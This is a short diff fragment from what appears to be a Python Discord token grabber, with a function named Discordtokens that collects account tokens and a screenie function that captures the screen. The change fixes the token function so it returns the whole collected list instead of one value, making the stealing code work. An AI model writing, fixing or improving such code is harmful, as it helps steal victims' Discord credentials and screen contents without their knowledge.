@@ -540,7 +540,7 @@ def Discordtokens():
                                         tokens.append(token)
     except:
         pass                                    
-    return token                                     
+    return tokens                                    
 
 def screenie():
     sss = ImageGrab.grab()
